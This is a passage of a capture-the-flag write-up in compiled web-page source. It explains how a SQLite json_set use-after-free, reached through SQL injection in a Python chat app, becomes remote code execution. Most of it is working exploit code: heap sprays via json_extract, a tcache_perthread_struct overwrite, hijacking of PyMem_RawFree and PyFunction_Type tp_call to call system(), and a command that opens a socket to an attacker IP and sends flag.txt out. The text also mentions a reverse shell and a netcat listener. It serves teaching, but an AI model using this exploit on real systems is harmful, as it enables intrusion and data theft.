",(0,i.jsx)(s.em,{children:"is"})," in use, in ",(0,i.jsx)(s.code,{children:"jsonSetFunc"}),", so this causes a UAF!"]}),"\n",(0,i.jsx)(s.p,{children:"Walking this through with the (slightly modified) test case:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-sql",children:"SELECT json_set(\n    '{}',\n    '$.a', json('1'),\n    '$.b', json('2'),\n    '$.c', json('3'),\n    '$.d', json('4')\n)\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:["All the ",(0,i.jsx)(s.code,{children:"json"})," function calls are evaluated. These would just return the strings themselves, but they'd be marked as ",(0,i.jsx)(s.code,{children:"JSON_SUBTYPE"}),". (They would be parsed and cached, but this doesn't affect much, except clear the previous cache)."]}),"\n",(0,i.jsxs)(s.li,{children:["The ",(0,i.jsx)(s.code,{children:"'{}'"})," would be parsed and cached by ",(0,i.jsx)(s.code,{children:"jsonParseCached"}),", placing it at the back of the queue."]}),"\n",(0,i.jsxs)(s.li,{children:["The ",(0,i.jsx)(s.code,{children:"'$.a'"})," key is looked up, and the ",(0,i.jsx)(s.code,{children:"null"})," value would be replaced by ",(0,i.jsx)(s.code,{children:"'1'"}),". Since it has ",(0,i.jsx)(s.code,{children:"JSON_SUBTYPE"}),", it's parsed and cached, pushing ",(0,i.jsx)(s.code,{children:"'{}'"})," 1 slot along."]}),"\n",(0,i.jsxs)(s.li,{children:["Repeat for ",(0,i.jsx)(s.code,{children:"'$.b'"})," and ",(0,i.jsx)(s.code,{children:"'$.c'"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:["By now, the original ",(0,i.jsx)(s.code,{children:"'{}'"})," is at the end of the queue, so when ",(0,i.jsx)(s.code,{children:"'4'"})," is parsed and cached, it forces ",(0,i.jsx)(s.code,{children:"'{}'"})," to be dequeued and freed, resulting in a UAF."]}),"\n"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/corchat_uaf.gif",alt:""}),(0,i.jsx)("figcaption",{})]}),"\n",(0,i.jsx)(s.h3,{id:"so-what-now",children:"So what now?"}),"\n",(0,i.jsx)(s.p,{children:"Right now, we have the DOS like the description mentioned, now for the RCE. But how?"}),"\n",(0,i.jsx)(s.p,{children:"Well first we need to control what happens right after the UAF is created to prevent a crash. So what happens next?"}),"\n",(0,i.jsxs)(s.p,{children:["Well after the parsing the value that needs to be added to the object, it needs to then add the nodes corresponding to that value. It does this with ",(0,i.jsx)(s.code,{children:"jsonParseAddNodeArray"}),"."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (186).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1121",children:"jsonParseAddNodeArray"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["Remember at this point, the ",(0,i.jsx)(s.code,{children:"pParse"})," object has been freed, which would corrupt some of the first fields of the object, depending on what bin it was freed to. By debugging, we can verify that it (usually) gets freed to tcache."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (187).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"Right after UAF"})})]}),"\n",(0,i.jsxs)(s.admonition,{type:"info",children:[(0,i.jsxs)(s.p,{children:["I debugged it by following ",(0,i.jsx)(s.a,{href:"https://ir0nstone.gitbook.io/notes/challenges-in-containers",children:"these instructions"}),":"]}),(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:["Running ",(0,i.jsx)(s.code,{children:"python"})," or ",(0,i.jsx)(s.code,{children:"python app.py"})]}),"\n",(0,i.jsxs)(s.li,{children:["Running ",(0,i.jsx)(s.code,{children:"gdbserver :9090 --attach $(pidof python3)"})," in another shell"]}),"\n",(0,i.jsxs)(s.li,{children:["Running gdb -> ",(0,i.jsx)(s.code,{children:"target remote 127.0.0.1:9090"})," in another another shell"]}),"\n"]})]}),"\n",(0,i.jsxs)(s.p,{children:["Here we see it's been freed specifically to ",(0,i.jsx)(s.code,{children:"tcachebins[0x60]"}),", which makes sense since we're on glibc 2.31, plus the size of the ",(0,i.jsx)(s.code,{children:"JsonParse"})," structure is 0x50 bytes (+ a few more from storing ",(0,i.jsx)(s.code,{children:"'{}'"}),"). And from the structure dump, we see that the tcache key (a pointer to ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),") overlaps with ",(0,i.jsx)(s.code,{children:"aNode"}),", which is a pointer to the list of nodes making up the ",(0,i.jsx)(s.code,{children:"JsonParse"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["This is interesting, because now we're in ",(0,i.jsx)(s.code,{children:"jsonParseAddNodeArray"}),", which is about to copy a new set of nodes to ",(0,i.jsx)(s.code,{children:"aNode"})," if there's room, and if there isn't, it will ",(0,i.jsx)(s.code,{children:"realloc"})," it."]}),"\n",(0,i.jsxs)(s.p,{children:["Theoretically this could allow arbitrary control over ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),", but there a few problems currently:"]}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:["An array of ",(0,i.jsx)(s.code,{children:"JsonNode"}),"s isn't very good for controlling data, as we don't have much control over these. This means that not only is it bad for arbitrary control, but by clobbering ",(0,i.jsx)(s.code,{children:"tcache"}),", it'll likely cause a crash in some ",(0,i.jsx)(s.code,{children:"malloc"})," call."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"realloc"}),"'ing ",(0,i.jsx)(s.code,{children:"tcache"})," to a smaller size also clobbers it, as a new size field will show up in the middle of ",(0,i.jsx)(s.code,{children:"tcache"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"nNode"})," and ",(0,i.jsx)(s.code,{children:"nAlloc"})," are also overwritten by the ",(0,i.jsx)(s.code,{children:"fd"}),", so if there's a pointer overlapping this, these fields will be very large and likely result in a crash."]}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:["The 3rd problem can be fixed by using a spray to empty ",(0,i.jsx)(s.code,{children:"tcachebins[0x60]"})," beforehand, that way the ",(0,i.jsx)(s.code,{children:"fd"})," field will be ",(0,i.jsx)(s.code,{children:"NULL"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["The 1st and 2nd problem we can solve by ",(0,i.jsx)(s.code,{children:"realloc"}),"'ing with a size larger than ",(0,i.jsx)(s.code,{children:"0x290"})," (the size of ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),"). If a ",(0,i.jsx)(s.code,{children:"realloc"})," call is passed a larger size than the current size of the chunk, and can't expand forward, it'll resort to just:"]}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"malloc"}),"'ing a new, larger chunk."]}),"\n",(0,i.jsx)(s.li,{children:"Copying over the data to the new chunk."}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"free"}),"'ing the old chunk."]}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:["This would allow us to perform a ",(0,i.jsx)(s.code,{children:"House of Spirit"})," attack on ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),", and if we could allocate on top of that with controlled data, we can get an arbitrary write."]}),"\n",(0,i.jsx)(s.h3,{id:"data-spraying",children:"Data Spraying"}),"\n",(0,i.jsx)(s.p,{children:"For this we'd need a way of spraying controlled data, and this is where I started to struggle, as I was unable to find such a primitive. It turns out the answer was held by another JSON function."}),"\n",(0,i.jsx)(s.p,{children:"After the CTF, I saw that ryaagard (the challenge author) revealed how they were able to spray data."}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (188).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"json_extract"})," spray"]})})]}),"\n",(0,i.jsxs)(s.p,{children:["This was rather annoying, because if I just kept looking at ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c",children:"src/json.c"})," I probably could've found it, but oh well."]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"json_extract"})," takes a JSON string and a key, extracts the value corresponding to the provided key, and returns it. It's implemented by ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2530",children:"jsonExtractFunc"}),", and the key part that makes this possible is ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L889",children:"jsonReturn"}),"."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (189).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L938",children:"jsonReturn"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["Specifically the ",(0,i.jsx)(s.code,{children:"JSON_STRING"})," case, and when the string contains escape sequences (signified by ",(0,i.jsx)(s.code,{children:"jnFlags & JNODE_RAW == 0 && jnFlags & JNODE_ESCAPE != 0"}),"), it will ",(0,i.jsx)(s.code,{children:"malloc"})," a chunk that's the same length as the escaped sequence, to ensure that there's no possibility of an overflow, as an escaped character will be longer than the character itself. It then goes on to unescape the sequence, making it very useful for a data spray. Although it should be noted that you can't control every single byte in a \"chunk\" you allocate, due to how the ",(0,i.jsx)(s.code,{children:"malloc"}),"'ed size will be larger than the unescaped size."]}),"\n",(0,i.jsxs)(s.p,{children:["We can also use this to spray ",(0,i.jsx)(s.code,{children:"tcachebins[0x60]"})," to empty it."]}),"\n",(0,i.jsxs)(s.p,{children:["To ensure these data sprays are preserved (i.e. not freed), we can use a sequence of ",(0,i.jsx)(s.code,{children:"SELECT json_extract(...)"})," statements joined by ",(0,i.jsx)(s.code,{children:"UNION"}),". I tried other ways of creating these sprays, such as string concatentation, or store them in a list, but both of these methods failed, likely because the strings would only be needed temporarily, and thus be freed (e.g. in concatenation of 2 strings, neither of them are needed again after the concatenation as they make a new, longer string). It seems that ",(0,i.jsx)(s.code,{children:"UNION"})," keeps them around however, perhaps because it only combines the results at the very end."]}),"\n",(0,i.jsx)(s.h3,{id:"smashing-tcache",children:"Smashing tcache"}),"\n",(0,i.jsx)(s.p,{children:"Let's put all of this together into a POC which overwrites tcache with junk."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-python",children:'from pwn import *\nimport string\n\nrequest2size = lambda req: (req+0x17)&(~0xf) if req>=9 else 0x20\nsize2usable = lambda sz: sz-8\n\ndef escape_byte(c, force=False):\n\tcharset = set(string.printable.encode())\n\tcharset -= set(string.whitespace.encode() + b"\'\\"")\n\tif not force:\n\t\tif c == 0:\n\t\t\treturn "\\\\0"\n\t\telif c in charset:\n\t\t\treturn chr(c)\n\treturn "\\\\x"+format(c, "02x")\n\ndef escape(x):\n\treturn "".join(map(escape_byte, x))\n\ndef malloc_escaped(escaped):\n\t# at least one character should be escaped to trigger the malloc\n\tassert "\\\\" in escaped\n\treturn "SELECT json_extract(\'{a:\\"%s\\"}\', \'$.a\')" % escaped\n\ndef spray(size, char="A"):\n\tassert size & 0xf == 0\n\tx = escape_byte(ord(char), force=True)\n\tx = x.ljust(size2usable(size)-2-1, char)\n\treturn malloc_escaped(x)\n\t\n\n# use json_extract with escaped strings to spray\nto_spray = [\n(0x60, 7),\n(0x290, 7),\n]\nsprays = []\nchar = 0x41\nfor size, count in to_spray:\n\tfor _ in range(count):\n\t\tsprays.append(spray(size, char=chr(char)))\n\t\tchar += 1\n\nmalloc_tcache = spray(0x290, char="X")\n\nlong_list = "[" + ",".join(["null"]*0x30) + "]"\njson = f"json_set(\'{{}}\', \'$.a\', json(\'1\'), \'$.b\', json(\'2\'), \'$.c\', json(\'3\'), \'$.d\', json(\'{long_list}\'))"\n\nstatements = []\nstatements.extend(sprays)\nstatements.append("SELECT " + json)\nstatements.append(malloc_tcache)\n\ninjection = " UNION ".join(["aaaa\')"] + statements) + "--"\nprint(injection)\n\nstatement = f"INSERT INTO messages (message) VALUES (\'{injection}\')"\nprint(f"db.cursor().execute({repr(statement)})")\n'})}),"\n",(0,i.jsx)(s.p,{children:"We start off by spraying chunks to empty:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"tcachebins[0x60]"}),": This will be used for the UAF'ed chunk, so we need ",(0,i.jsx)(s.code,{children:"fd"})," to be ",(0,i.jsx)(s.code,{children:"NULL"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"tcachebins[0x290]"}),": Ensure that when we free ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),", it gets freed to tcache, which makes it easier to reallocate. We don't ",(0,i.jsx)(s.em,{children:"need"})," to fully empty it (1 slot would work just fine), but we might as well, just to be sure we'll get a slot (plus nothing's stopping us)."]}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:["Then we trigger the UAF using a modified version of the test case. The change is that we use a list longer than 0x29 elements, to ensure that its ",(0,i.jsx)(s.code,{children:"aNode"})," array is bigger than 0x290 bytes (",(0,i.jsx)(s.code,{children:"sizeof(JsonNode)=0x10"}),"), which forces ",(0,i.jsx)(s.code,{children:"realloc"})," to free ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),"."]}),"\n",(0,i.jsx)(s.p,{children:"Finally we reclaim the allocation with a dummy."}),"\n",(0,i.jsx)(s.p,{children:"We can test this as follows:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:'ctf@0ac532cec93d:/app$ python3\nPython 3.8.10 (default, Mar 25 2024, 10:42:49) \n[GCC 9.4.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> import sqlite3\n>>> db = sqlite3.connect("chat.db")\n>>> db.cursor().execute(...)\n'})}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (191).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"tcache"})," after allocation"]})})]}),"\n",(0,i.jsx)(s.p,{children:"Bingo!"}),"\n",(0,i.jsx)(s.h3,{id:"write-what-where",children:"Write what where"}),"\n",(0,i.jsxs)(s.p,{children:["Now that we have control over ",(0,i.jsx)(s.code,{children:"tcache_perthread_struct"}),", what can we do with that? ASLR is in place, and turning this into a leak wouldn't be possible, so is there anything we can target? Yes there is, because thankfully the ",(0,i.jsx)(s.code,{children:"python"})," binary is compiled without ",(0,i.jsx)(s.code,{children:"PIE"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (192).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"pwn checksec python3.8"})})})]}),"\n",(0,i.jsx)(s.p,{children:"So what can we target here?"}),"\n",(0,i.jsxs)(s.p,{children:["Well one idea that I had was targetting the GOT, but this doesn't work for a very annoying reason: ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/malloc.c#L318",children:"sqlite3_malloc"}),". This is a wrapper around ",(0,i.jsx)(s.code,{children:"malloc"})," that does some locking and memory tracking. Part of that memory tracking is counting how many total bytes have been malloc'ed, and to do this it uses ",(0,i.jsx)(s.code,{children:"malloc_usable_size"}),"."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (193).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/malloc.c#L265",children:"mallocWithAlarm"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["So with our allocations we have to be careful: if we use a size that's too big (like an address) we'll get a crash, because part of determining the usable size is finding whether the next chunk's ",(0,i.jsx)(s.code,{children:"prev_inuse"})," bit is set, so finding the next chunk based on a large size wanders into no man's land."]}),"\n",(0,i.jsxs)(s.p,{children:["So ",(0,i.jsx)(s.code,{children:"GOT"})," is a no-go. I also considered possibly targetting a python class method. When a class method is called, it's typically done so with the first argument being the object itself (like a ",(0,i.jsx)(s.code,{children:"thiscall"}),"). So if we could write a command to the start of the object, then overwrite a class method to ",(0,i.jsx)(s.code,{children:"system@plt"}),", we could get RCE. I didn't find a way to do this, especially since most objects are on the heap, which we can't access. And while there some objects we can access in ",(0,i.jsx)(s.code,{children:"_PyRuntime"}),", it's still not ideal because we need to use a reverse shell command, which we can't fit inside 8 bytes (at offset ",(0,i.jsx)(s.code,{children:"+0x08"})," is the pointer to the class object)."]}),"\n",(0,i.jsx)(s.p,{children:"So I conceded and looked at ryaagard's solution, and this is what I understood of it:"}),"\n",(0,i.jsx)(s.h3,{id:"one-gadgets-in-python",children:"One gadgets in python?"}),"\n",(0,i.jsxs)(s.p,{children:["The first trick used employed by ryaagard was ",(0,i.jsx)(s.code,{children:"PyMem_RawFree"}),"."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (194).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/obmalloc.c#L593",children:"PyMem_RawFree"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["The ",(0,i.jsx)(s.code,{children:"PyMem_Raw"})," set of allocation functions use a ",(0,i.jsx)(s.a,{href:"https://github.com/python/cpython/blob/3.8/Include/cpython/pymem.h#L53",children:"context object"})," to store function handlers. It first loads the function into ",(0,i.jsx)(s.code,{children:"rax"}),", and if it's some specific function (which is a no-op function):"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (195).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"A no-op free function"})})]}),"\n",(0,i.jsxs)(s.p,{children:["Then it uses the regular ",(0,i.jsx)(s.code,{children:"free"}),". Otherwise, it will jump to it, with the first argument being some object from the same context object. This is very appealing, because if we can smash this context object, then any call to it will execute an arbitrary function (like ",(0,i.jsx)(s.code,{children:"system@plt"}),") with a controlled first argument (like a reverse shell). This effectively turns ",(0,i.jsx)(s.code,{children:"PyMem_RawFree"})," into a ",(0,i.jsx)(s.em,{children:"constraintless"})," one_gadget."]}),"\n",(0,i.jsx)(s.p,{children:"So we'll need 2 writes:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Write a reverse shell command into memory."}),"\n",(0,i.jsxs)(s.li,{children:["Smash the ",(0,i.jsx)(s.code,{children:"PyMem_Raw"})," context."]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"overwriting-a-class-method",children:"Overwriting a class method"}),"\n",(0,i.jsxs)(s.p,{children:["Now that we have a one_gadget, we can overwrite any class method, and if it's ever called, we'll get a reverse shell. ryaagard opted to overwrite ",(0,i.jsx)(s.code,{children:"PyFunction_Type"}),", which is the object representing the python function type. It stores fields, like function pointers, which handle different functionalities of ",(0,i.jsx)(s.code,{children:"function"})," objects. One of these is ",(0,i.jsx)(s.code,{children:"tp_call"}),", which handles calling functions . This is an ideal target, because there will be many instances where a python function would be called, and all it takes is one of these calls to happen to give us a reverse shell. However, by default ",(0,i.jsx)(s.code,{children:"tp_call"})," isn't actually used, so we can't just overwrite it and call it a day. Let's have a closer look:"]}),"\n",(0,i.jsxs)(s.p,{children:["Searching for references of ",(0,i.jsx)(s.code,{children:"tp_call"})," yields ",(0,i.jsx)(s.code,{children:"_PyObject_MakeTpCall"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (196).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/call.c#L119",children:"_PyObject_MakeTpCall"})})})]}),"\n",(0,i.jsx)(s.p,{children:"Which, as you might expect, goes on to call the function:"}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (197).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/call.c#L156",children:"_PyObject_MakeTpCall"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["All seems good, so where is this (and ",(0,i.jsx)(s.code,{children:"tp_call"})," in general) used? The 2 main instances I found were:"]}),"\n",(0,i.jsxs)("div",{children:[(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (198).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/call.c#L74",children:"_PyObject_FastCallDict"})})})]})," ",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (199).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/call.c#L215",children:"PyObject_Call"})})})]})]}),"\n",(0,i.jsxs)(s.p,{children:["Both of which are used by ",(0,i.jsx)(s.code,{children:"PyEval_CallObjectWithKeywords"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (200).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Objects/call.c#L806",children:"PyEval_CallObjectWithKeywords"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["In both of these cases, we can see a common thread: ",(0,i.jsx)(s.code,{children:"_PyVectorcall_Function"})," is used to determine whether or not to use ",(0,i.jsx)(s.code,{children:"tp_call"}),". It seems like this has to return ",(0,i.jsx)(s.code,{children:"NULL"})," for python to decide to use ",(0,i.jsx)(s.code,{children:"tp_call"}),", so how do we do that?"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (202).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/python/cpython/blob/3.8/Include/cpython/abstract.h#L81",children:"_PyVectorcall_Function"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["It turns out that it checks for feature ",(0,i.jsx)(s.code,{children:"VECTORCALL"}),", by checking the ",(0,i.jsx)(s.code,{children:"tp_flags"})," field of the class, and seeing whether the ",(0,i.jsx)(s.a,{href:"https://github.com/python/cpython/blob/3.8/Include/object.h#L293",children:"_Py_TPFLAGS_HAVE_VECTORCALL"})," (",(0,i.jsx)(s.code,{children:"1<<11"}),") flag is set. If it's disabled (i.e. flag isn't set), then it resorts to ",(0,i.jsx)(s.code,{children:"tp_call"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["We can determine, by looking at the ",(0,i.jsx)(s.a,{href:"https://github.com/python/cpython/blob/3.8/Include/cpython/object.h#L177",children:"_typeobject"})," struct definition, that the offsets we need are:"]}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"0x80"}),": ",(0,i.jsx)(s.code,{children:"tp_call"})," (= ",(0,i.jsx)(s.code,{children:"PyMem_RawFree"}),")"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"0xa8"}),": ",(0,i.jsx)(s.code,{children:"tp_flags"})," (= ",(0,i.jsx)(s.code,{children:"0"}),")"]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"more-crashes",children:"More crashes"}),"\n",(0,i.jsxs)(s.p,{children:["We also have another problem of triggering ",(0,i.jsx)(s.code,{children:"tp_call"}),". This because another snag which is the fact that at the end of executing the SQL statement, like a reasonable application which wants to avoid memory leaks (lame), it frees all the memory it allocated previously, including our arbitrary allocations. When freeing these, the process will abort because they're obviously malformed \"chunks\", so we never actually reach the python part of the thread we corrupt, meaning our corrupted data isn't used by this thread."]}),"\n",(0,i.jsxs)(s.p,{children:["Fortunately, the web application is multithreaded, and share all the same memory, so while the current thread may abort, another thread may want to call a python function, and will use our corrupted ",(0,i.jsx)(s.code,{children:"tp_call"}),", before the application can abort. So ideally we'd need to stall our thread from aborting, to give us time for the application to trigger our reverse shell."]}),"\n",(0,i.jsxs)(s.p,{children:["While sqlite doesn't have any kind of ",(0,i.jsx)(s.code,{children:"SLEEP"})," statement, we can use an SQL statement that would take a while to evaluate, which are also commonplace in SQL time-based injections. So we can use something like the following:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-sql",children:"SELECT 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))\n"})}),"\n",(0,i.jsx)(s.h2,{id:"solution",children:"Solution"}),"\n",(0,i.jsxs)(s.p,{children:["So finally, putting ",(0,i.jsx)(s.em,{children:(0,i.jsx)(s.strong,{children:"all"})})," of this together, we can finally produce the following exploit:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-python",children:'from pwn import *\nimport string\n\npython = context.binary = ELF("python3.8")\n\nIP, PORT = \'[insert ip here]\',9999\n\nrequest2size = lambda req: (req+0x17)&(~0xf) if req>=9 else 0x20\nsize2usable = lambda sz: sz-8\n\ndef escape_byte(c, force=False):\n\tcharset = set(string.printable.encode())\n\tcharset -= set(string.whitespace.encode() + b"\'\\"")\n\tif not force:\n\t\tif c == 0:\n\t\t\treturn "\\\\0"\n\t\telif c in charset:\n\t\t\treturn chr(c)\n\treturn "\\\\x"+format(c, "02x")\n\ndef escape(x):\n\treturn "".join(map(escape_byte, x))\n\ndef malloc_escaped(escaped):\n\t# at least one character should be escaped to trigger the malloc\n\tassert "\\\\" in escaped\n\treturn "SELECT json_extract(\'{a:\\"%s\\"}\', \'$.a\')" % escaped\n\ndef spray(size, char="A"):\n\tassert size & 0xf == 0\n\tx = escape_byte(ord(char), force=True)\n\tx = x.ljust(size2usable(size)-2-1, char)\n\treturn malloc_escaped(x)\n\t\n\n# use json_extract with escaped strings to spray\nto_spray = [\n(0x60, 7),\n(0x290, 7),\n]\nsprays = []\nchar = 0x41\nfor size, count in to_spray:\n\tfor _ in range(count):\n\t\tsprays.append(spray(size, char=chr(char)))\n\t\tchar += 1\n\ndef pad_to_size(escaped, sz):\n\treturn escaped + "\\\\x00" * ((sz-0x10-len(escaped))//4)\n\ndef malloc(data, sz):\n\tdata = escape(data)\n\tassert request2size(len(data)+2+1) <= sz\n\tdata = pad_to_size(data, sz)\n\treturn malloc_escaped(data)\n\ntcache = {}\n\n# put cmd in memory\n\n# 0x93d900 <_PyRuntime+672>\nscratch = 0x93d900\n\nsz = 0x100\ncmd = f"python3 -c \\"import socket;s=socket.socket();s.connect((\'{IP}\',{PORT}));s.send(open(\'flag.txt\',\'rb\').read());s.close()\\""\ncmd = cmd.encode() + b"\\x00"\nmalloc_cmd = malloc(cmd, sz)\n\ntcache[sz] = scratch\n\n# overwrite _PyMem_RawFree\n\nsz = 0x70\npymem_overwrite = flat({\n\t0x00: scratch,\n\t0x20: python.plt.system,\n})\nmalloc_pymem_overwrite = malloc(pymem_overwrite, sz)\n\ntcache[sz] = 0x90b5e0\n\n# overwrite PyFunction_Type->tp_call\n\nsz = 0x80\n# we need to allocate 0x10 bytes earlier to prevent a musable() crash\ntpcall_overwrite = flat({\n\t0x10: python.sym.PyMem_RawFree,\t\t# tp_call\n\t0x38: 0\t\t\t\t\t\t\t\t# tp_flags\n})\nmalloc_tpcall_overwrite = malloc(tpcall_overwrite, sz)\n\ntcache[sz] = 0x8fba30\t# PyFunction_Type+112\n\n# construct tcache\n\ntcache_sizes = b""\ntcache_ptrs = b""\nfor sz in range(0x20, 0x420, 0x10):\n\tif sz in tcache:\n\t\ttcache_sizes += p16(1)\n\t\ttcache_ptrs += p64(tcache[sz])\n\telse:\n\t\ttcache_sizes += p16(0)\n\t\ttcache_ptrs += b"X"*8\ntcache = tcache_sizes + tcache_ptrs\ntcache = escape(tcache)[:0x280]\nmalloc_tcache = malloc_escaped(tcache)\n\nlong_list = ("[" + ",".join(["null"]*0x30)) + "]"\njson = f"json_set(\'{{}}\', \'$.a\', json(\'1\'), \'$.b\', json(\'2\'), \'$.c\', json(\'3\'), \'$.d\', json(\'{long_list}\'))"\n\nstatements = []\nstatements.extend(sprays)\nstatements.append("SELECT " + json)\nstatements.append(malloc_tcache)\nstatements.append(malloc_cmd)\nstatements.append(malloc_pymem_overwrite)\nstatements.append(malloc_tpcall_overwrite)\nstatements.append("SELECT 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(200000000/2))))")\n\ninjection = " UNION ".join(["aaaa\')"] + statements) + "--"\nprint(injection)\n'})}),"\n",(0,i.jsx)(s.p,{children:"To receive the reverse shell I chose to spin up a digitalocean instance, and setup a netcat listener. Let's fire away!"}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (203).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"Sending the 